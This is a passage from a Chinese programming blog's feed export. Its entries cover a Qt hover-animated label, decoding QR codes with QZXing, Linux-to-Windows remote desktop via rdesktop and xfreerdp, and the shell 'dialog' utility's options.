class="hljs-number">0</span>);<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">enterEvent</span><span class="hljs-params">(QEvent *event)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leaveEvent</span><span class="hljs-params">(QEvent *event)</span></span>;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// MYLABEL_H</span></span><br></code></pre></div></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">mylabel.cpp<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;mylabel.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QMovie&gt;</span></span><br>MyLabel::<span class="hljs-built_in">MyLabel</span>(QWidget *parent):<span class="hljs-built_in">QLabel</span>(parent)<br>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MyLabel::enterEvent</span><span class="hljs-params">(QEvent *event)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">setStyleSheet</span>(<span class="hljs-string">&quot;border: 1px solid rgb(111, 156, 207);background-color:rgba(150,150,150,50)&quot;</span>);<br>    <span class="hljs-built_in">setCursor</span>(Qt::PointingHandCursor);<br>    QMovie *movie=<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">movie</span>();<br>    <span class="hljs-comment">//开始播放</span><br>    movie-&gt;<span class="hljs-built_in">start</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MyLabel::leaveEvent</span><span class="hljs-params">(QEvent *event)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">setStyleSheet</span>(<span class="hljs-string">&quot;border:none&quot;</span>);<br>    <span class="hljs-built_in">setCursor</span>(Qt::ArrowCursor);<br>    QMovie *movie=<span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">movie</span>();<br>    <span class="hljs-comment">//跳转到动态图的初始帧</span><br>    movie-&gt;<span class="hljs-built_in">jumpToFrame</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//停止</span><br>    movie-&gt;<span class="hljs-built_in">stop</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>我在Ui窗口添加了了一个table widget部件,所以还要先设置相应的参数<br />
<img src="/uploads/images/files/demo2.png" alt="img" /></p>
<p>OK,的确挺简单的…当然还有很多问题也要考虑…</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt&amp;QZXing识别二维码</title>
    <url>/linux-qzxing/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<p>最近在网上看到一篇博客,讲的是二维码的生成和识别</p>
<span id="more"></span>
<p>借用一下</p>
<blockquote>
<p>ZXing<br />
ZXing是一个开放源码的，用Java实现的多种格式的1D/2D条码图像处理库，包含了联系到其他语言的端口。<br />
网址：<a href="https://code.google.com/p/zxing">https://code.google.com/p/zxing</a>.</p>
<p>Libqrencode<br />
Libqrencode(QRencode)是一个用C语言编写的用来解析二维条形码(QR Code)的程序库，Libqrencode通过手机的CCD摄像头来扫描二维条形码。二维码容量可达7000个数字或4000个字符，是非常强大的。<br />
网址：<a href="http://fukuchi.org/works/qrencode/">http://fukuchi.org/works/qrencode/</a>.</p>
<p>ZBar<br />
ZBar是款桌面电脑用条形码/二维码扫描工具，支持摄像头及图片扫描，支持多平台包括iPhone手机。同时 ZBar提供了二维码扫描的API开发包。<br />
网址：<a href="http://zbar.sourceforge.net">http://zbar.sourceforge.net</a>.<br />
更多参考：<a href="http://sourceforge.net/apps/mediawiki/zbar/index.php">http://sourceforge.net/apps/mediawiki/zbar/index.php</a>.</p>
<p>Open Source QR Code Library<br />
二维码编码/解码的Java库（J2SE, J2ME MIDP2.0/CLDC1.0）。<br />
网址：<a href="http://qrcode.sourceforge.jp/index.html.en">http://qrcode.sourceforge.jp/index.html.en</a>.</p>
<p>QZXing<br />
Qt包装ZXing的解码库。<br />
网址：<a href="http://sourceforge.net/projects/qzxing">http://sourceforge.net/projects/qzxing</a>.<br />
更多参考：<a href="https://projects.developer.nokia.com/QZXing">https://projects.developer.nokia.com/QZXing</a>.</p>
</blockquote>
<p>然而本人能力有限,这里只选取了 <strong>QZXing</strong> 解码库,以后有时间在慢慢琢磨…</p>
<p>example:<br />
<img src="/uploads/images/file4_qt/qr.png" alt="img" /></p>
<h3 id="qzxing"><a class="markdownIt-Anchor" href="#qzxing"></a> QZXing</h3>
<p>首先到github获取到源码</p>
<blockquote>
<p>git clone <a href="https://github.com/ftylitak/qzxing.git">https://github.com/ftylitak/qzxing.git</a></p>
</blockquote>
<p>当然也可以下zip压缩包</p>
<h3 id="how-to-include"><a class="markdownIt-Anchor" href="#how-to-include"></a> How to include</h3>
<p>qzxing上讲的还比较清楚…怎么使用<img src="/uploads/images/file4_qt/qt1.png" alt="img" /></p>
<ul>
<li>
<p>把QZXing目录直接复制到项目的根目录下,并且在项目的 .pro 中加入 <code>include(../../src/QZXing.pri)</code></p>
</li>
<li>
<p>或者把源码编译成动态库(dynamic library)</p>
<blockquote>
<p>qmake src/QZXing.pro<br />
make</p>
</blockquote>
</li>
</ul>
<h3 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h3>
<p><img src="/uploads/images/file4_qt/qt2.png" alt="img" /></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;widget.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ui_widget.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QZXing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPixmap&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QDebug&gt;</span></span><br>Widget::<span class="hljs-built_in">Widget</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QWidget</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::Widget)&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>&#125;<br>Widget::~<span class="hljs-built_in">Widget</span>()&#123;<br>    <span class="hljs-keyword">delete</span> ui;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FILE_PATH <span class="hljs-meta-string">&quot;/root/Desktop/l.png&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::on_pushButton_clicked</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">QPixmap <span class="hljs-title">pixmap</span><span class="hljs-params">(FILE_PATH)</span></span>;<br>    ui-&gt;label-&gt;<span class="hljs-built_in">setPixmap</span>(pixmap.<span class="hljs-built_in">scaled</span>(ui-&gt;label-&gt;<span class="hljs-built_in">size</span>()));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::on_pushButton_2_clicked</span><span class="hljs-params">()</span></span>&#123;<br>    QZXing *decoder=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QZXing</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-comment">//设置解码格式</span><br>    decoder-&gt;<span class="hljs-built_in">setDecoder</span>(QZXing::DecoderFormat_QR_CODE);<br>    <span class="hljs-comment">//start decode</span><br>    QString str= decoder-&gt;<span class="hljs-built_in">decodeImage</span>(ui-&gt;label-&gt;<span class="hljs-built_in">pixmap</span>()-&gt;<span class="hljs-built_in">toImage</span>());<br>    <span class="hljs-keyword">if</span> (!str.<span class="hljs-built_in">isEmpty</span>())&#123;<br>        ui-&gt;textEdit-&gt;<span class="hljs-built_in">setText</span>(str);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        ui-&gt;textEdit-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;Failed!!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="尾"><a class="markdownIt-Anchor" href="#尾"></a> 尾</h3>
<p>当然,感兴趣的可以去看源码有解码就有编码,网上有很多库可以用,也可以自己写一个出来…不过这要技术到家…不过目前我正在学习使用 libqrencode ,可以到官网瞧瞧https://fukuchi.org/works/qrencode/</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux RDP远程桌面连接Windows</title>
    <url>/linux-rdp-windows/</url>
    <content><![CDATA[<p>远程桌面协议RDP（Remote Desktop Protocol）是Microsoft开发的专有协议，它为用户提供图形界面以通过网络连接到另一台计算机。</p>
<span id="more"></span>
<p>Windows可以通过VNC远程桌面连接Linux，反过来却不行。但是确实需要远程桌面控制Windows，那么可以利用 <strong>rdesktop</strong> 或 <strong>xfreerdp</strong>，两者均是Linux下支持Windows远程桌面连接的客户端程序。</p>
<h3 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h3>
<p><strong>rdesktop</strong><br />
ubuntu:<br />
<code>sudo apt install rdesktop</code><br />
arch/manjaro:<br />
<code>sudo pacman -S rdesktop</code></p>
<p><strong>xfreerdp</strong><br />
ubuntu:<br />
<code>sudo apt get install freerdp</code><br />
arch/manjaro:<br />
<code>sudo pacman -S freerdp</code></p>
<h3 id="rdesktop"><a class="markdownIt-Anchor" href="#rdesktop"></a> rdesktop</h3>
<p>在此之前需要让Windows支持远程协助，可以在系统属性-远程中开启：【允许远程协助连接这台计算机】+【允许远程连接到此计算机】，如果勾选了【仅运行运行使用网络级别身份验证的远程桌面单位计算机连接】，那么 <strong>rdesktop</strong> 无法连接，报错信息：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Core(<span class="hljs-built_in">warning</span>): Certificate received <span class="hljs-keyword">from</span> <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">trusted</span> <span class="hljs-keyword">by</span> this <span class="hljs-keyword">system</span>, an <span class="hljs-keyword">exception</span> has been added <span class="hljs-keyword">by</span> the <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> trust this specific certificate.<br>Failed <span class="hljs-keyword">to</span> initialize NLA, <span class="hljs-keyword">do</span> you have correct Kerberos TGT initialized ?<br>Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span>, CredSSP required <span class="hljs-keyword">by</span> <span class="hljs-keyword">server</span> (<span class="hljs-keyword">check</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">server</span> has disabled <span class="hljs-built_in">old</span> TLS versions, <span class="hljs-keyword">if</span> yes use -V <span class="hljs-keyword">option</span>).<br></code></pre></div></td></tr></table></figure>
<p>解决方法有两种：1）不勾选该选项；2）使用 <strong>xfreerdp</strong></p>
<p><code>rdesktop 192.168.xxx.xxx</code> 默认选项就可以远程桌面连接Windows（需要输入用户口令）。<br />
rdesktop一些常用选项：<br />
-u : Windows用户<br />
-p : Windows口令（非PIN）<br />
-g : 窗口大小，如 1366x768<br />
-f  :全屏<br />
-a : 色彩深度 ：8, 15, 16, 24, 32<br />
-r sound ：支持声音<br />
-r clipboard：支持剪切板<br />
-r disk： 远程连接时挂载本地文件目录</p>
<p>详细信息 <code>man rdesktop</code></p>
<p><strong>examples</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">% rdesktop 192.168.1.6<br>% rdesktop -u user -p - -f<br>% rdesktop -u user -p passwd -g 1366x768 -r sound  -a 32 -r clipboard:PRIMARYCLIPBOARD -r disk:MyDir=/mnt/shared 192.168.1.6 <br></code></pre></div></td></tr></table></figure>
<h3 id="xfreerdp"><a class="markdownIt-Anchor" href="#xfreerdp"></a> xfreerdp</h3>
<p>xfreerdp选项比较多，不过掌握基本的也就够了</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/v:&lt;server&gt;[:port] 默认端口 3389<br>/w、/h 窗口大小<br>/size:&lt;width&gt;x&lt;height&gt; 窗口大小，如 1024x768<br>/f 全屏<br>/workarea Use available work area<br>/bpp:&lt;depth&gt; 色彩深度 <br>/u:&lt;user&gt;[@&lt;domain&gt;] <br>/p:&lt;password&gt;<br>/d:&lt;domain&gt; 域，可选<br>+fonts 平滑字体<br></code></pre></div></td></tr></table></figure>
<p><strong>examples</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">% xfreerdp /v:192.168.1.6<br>% xfreerdp /u:user /p:passwd /v:192.168.1.6 /f<br>% xfreerdp /bpp:32 +fonts /u:user /p:passwd /v:192.168.1.6 /workarea <br>% xfreerdp /bpp:32 +clipboard +fonts /u:user /p:passwd /workarea /sound /drive:shared,/mnt/shared /v:192.168.1.6 <br>% xfreerdp /bpp:32 +clipboard +fonts /u:user /p:passwd /size:1366x768 /sound -v:192.168.1.6:3389 <br></code></pre></div></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Windows</tag>
        <tag>RDP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Shell窗口化</title>
    <url>/linux-shell-window/</url>
    <content><![CDATA[<p>前段时间在学习Linux shell编程时,发现了几个比较好玩的工具,这里给大家分享一下…(Just for fun!)</p>
<span id="more"></span>
<p>以下三个关于创建窗口部件的包,一般应用在没有窗口界面的脚本(Script)中</p>
<h3 id="1dialog"><a class="markdownIt-Anchor" href="#1dialog"></a> 1.Dialog</h3>
<p>安装方法: <code>apt-get install dialog</code></p>
<p>help:</p>
<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">cdialog (ComeOn Dialog!) version <span class="hljs-number">1.3</span><span class="hljs-number">-20171209</span><br>Copyright <span class="hljs-number">2000</span><span class="hljs-number">-2016</span>,<span class="hljs-number">2017</span> Thomas E. Dickey<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br>* Display dialog boxes from shell scripts *<br><span class="hljs-symbol">Usage:</span> dialog <span class="hljs-params">&lt;options&gt;</span> &#123; --and-widget <span class="hljs-params">&lt;options&gt;</span> &#125;<br>where options are <span class="hljs-string">&quot;common&quot;</span> options, followed by <span class="hljs-string">&quot;box&quot;</span> options<br>Special options:<br>  [--create-rc <span class="hljs-string">&quot;file&quot;</span>]<br>Common options:<br>  [--ascii-lines] [--aspect <span class="hljs-params">&lt;ratio&gt;</span>] [--backtitle <span class="hljs-params">&lt;backtitle&gt;</span>] [--beep]<br>  [--beep-after] [--begin <span class="hljs-params">&lt;y&gt;</span> <span class="hljs-params">&lt;x&gt;</span>] [--cancel-label <span class="hljs-params">&lt;str&gt;</span>] [--clear]<br>  [--colors] [--column-separator <span class="hljs-params">&lt;str&gt;</span>] [--cr-wrap] [--date-format <span class="hljs-params">&lt;str&gt;</span>]<br>  [--default-button <span class="hljs-params">&lt;str&gt;</span>] [--default-item <span class="hljs-params">&lt;str&gt;</span>] [--defaultno]<br>  [--exit-label <span class="hljs-params">&lt;str&gt;</span>] [--extra-button] [--extra-label <span class="hljs-params">&lt;str&gt;</span>]<br>  [--help-button] [--help-label <span class="hljs-params">&lt;str&gt;</span>] [--help-status] [--help-tags]<br>  [--hfile <span class="hljs-params">&lt;str&gt;</span>] [--hline <span class="hljs-params">&lt;str&gt;</span>] [--ignore] [--input-fd <span class="hljs-params">&lt;fd&gt;</span>]<br>  [--insecure] [--item-help] [--keep-tite] [--keep-window] [--last-key]<br>  [--max-input <span class="hljs-params">&lt;n&gt;</span>] [--no-cancel] [--no-collapse] [--no-cr-wrap]<br>  [--no-items] [--no-kill] [--no-label <span class="hljs-params">&lt;str&gt;</span>] [--no-lines] [--no-mouse]<br>  [--no-nl-expand] [--no-ok] [--no-shadow] [--no-tags] [--nook]<br>  [--ok-label <span class="hljs-params">&lt;str&gt;</span>] [--output-fd <span class="hljs-params">&lt;fd&gt;</span>] [--output-separator <span class="hljs-params">&lt;str&gt;</span>]<br>  [--print-maxsize] [--print-size] [--print-version] [--quoted]<br>  [--reorder] [--scrollbar] [--separate-output] [--separate-widget <span class="hljs-params">&lt;str&gt;</span>]<br>  [--shadow] [--single-quoted] [--size-err] [--sleep <span class="hljs-params">&lt;secs&gt;</span>] [--stderr]<br>  [--stdout] [--tab-correct] [--tab-len <span class="hljs-params">&lt;n&gt;</span>] [--time-format <span class="hljs-params">&lt;str&gt;</span>]<br>  [--timeout <span class="hljs-params">&lt;secs&gt;</span>] [--title <span class="hljs-params">&lt;title&gt;</span>] [--trace <span class="hljs-params">&lt;file&gt;</span>] [--trim]<br>  [--version] [--visit-items] [--week-start <span class="hljs-params">&lt;str&gt;</span>] [--yes-label <span class="hljs-params">&lt;str&gt;</span>]<br>Box options:<br>  --buildlist    <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;list-height&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;status1&gt;</span>...<br>  --calendar     <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;day&gt;</span> <span class="hljs-params">&lt;month&gt;</span> <span class="hljs-params">&lt;year&gt;</span><br>  --checklist    <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;list height&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;status1&gt;</span>...<br>  --dselect      <span class="hljs-params">&lt;directory&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --editbox      <span class="hljs-params">&lt;file&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --form         <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;form height&gt;</span> <span class="hljs-params">&lt;label1&gt;</span> <span class="hljs-params">&lt;l_y1&gt;</span> <span class="hljs-params">&lt;l_x1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;i_y1&gt;</span> <span class="hljs-params">&lt;i_x1&gt;</span> <span class="hljs-params">&lt;flen1&gt;</span> <span class="hljs-params">&lt;ilen1&gt;</span>...<br>  --fselect      <span class="hljs-params">&lt;filepath&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --gauge        <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> [<span class="hljs-params">&lt;percent&gt;</span>]<br>  --infobox      <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --inputbox     <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> [<span class="hljs-params">&lt;init&gt;</span>]<br>  --inputmenu    <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;menu height&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span>...<br>  --menu         <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;menu height&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span>...<br>  --mixedform    <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;form height&gt;</span> <span class="hljs-params">&lt;label1&gt;</span> <span class="hljs-params">&lt;l_y1&gt;</span> <span class="hljs-params">&lt;l_x1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;i_y1&gt;</span> <span class="hljs-params">&lt;i_x1&gt;</span> <span class="hljs-params">&lt;flen1&gt;</span> <span class="hljs-params">&lt;ilen1&gt;</span> <span class="hljs-params">&lt;itype&gt;</span>...<br>  --mixedgauge   <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;percent&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span>...<br>  --msgbox       <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --passwordbox  <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> [<span class="hljs-params">&lt;init&gt;</span>]<br>  --passwordform <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;form height&gt;</span> <span class="hljs-params">&lt;label1&gt;</span> <span class="hljs-params">&lt;l_y1&gt;</span> <span class="hljs-params">&lt;l_x1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;i_y1&gt;</span> <span class="hljs-params">&lt;i_x1&gt;</span> <span class="hljs-params">&lt;flen1&gt;</span> <span class="hljs-params">&lt;ilen1&gt;</span>...<br>  --pause        <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;seconds&gt;</span><br>  --prgbox       <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;command&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --programbox   <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --progressbox  <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --radiolist    <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;list height&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;status1&gt;</span>...<br>  --rangebox     <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;min-value&gt;</span> <span class="hljs-params">&lt;max-value&gt;</span> <span class="hljs-params">&lt;default-value&gt;</span><br>  --tailbox      <span class="hljs-params">&lt;file&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --tailboxbg    <span class="hljs-params">&lt;file&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --textbox      <span class="hljs-params">&lt;file&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>  --timebox      <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;hour&gt;</span> <span class="hljs-params">&lt;minute&gt;</span> <span class="hljs-params">&lt;second&gt;</span><br>  --treeview     <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span> <span class="hljs-params">&lt;list-height&gt;</span> <span class="hljs-params">&lt;tag1&gt;</span> <span class="hljs-params">&lt;item1&gt;</span> <span class="hljs-params">&lt;status1&gt;</span> <span class="hljs-params">&lt;depth1&gt;</span>...<br>  --yesno        <span class="hljs-params">&lt;text&gt;</span> <span class="hljs-params">&lt;height&gt;</span> <span class="hljs-params">&lt;width&gt;</span><br>Auto-size with height and width = <span class="hljs-number">0.</span> Maximize with height and width = <span class="hljs-number">-1.</span><br>Global-auto-size if also menu_height/list_height = <span class="hljs-number">0.</span><br><br></code></pre></div></td></tr></table></figure>
<h4 id="dialog-命令选项option"><a class="markdownIt-Anchor" href="#dialog-命令选项option"></a> dialog 命令选项(option)</h4>
<blockquote>
<p><strong>–add-widget</strong> 继续下个对话框,直到按下Esc或Cancel按钮<br />
<strong>–aspect ratio</strong> 指定窗口宽度和高度的宽高比<br />
<strong>–backtitle title</strong> 指定显示在屏幕顶部背景上的标题<br />
<strong>–begin x y</strong> 指定窗口左上角的起始位置<br />
<strong>–cancel-label label</strong> 指定Cancel按钮的替代标签<br />
<strong>–clear</strong> 用默认的对话背景色来清空屏幕内容<br />
<strong>–colors</strong> 在对话文本中嵌入ANSI色彩编码<br />
<strong>–cr-wrap</strong> 在对话文本中允许使用换行符并强制换行<br />
<strong>–create-rc file</strong> 将示例配置文件的内容复制到指定的file文件中 1<br />
<strong>–defaultno</strong> 将yes/no对话框的默认答案设为No<br />
<strong>–default-item string</strong> 设定复选列表、表单或菜单对话中的默认项<br />
<strong>–exit-label label</strong> 指定Exit按钮的替代标签<br />
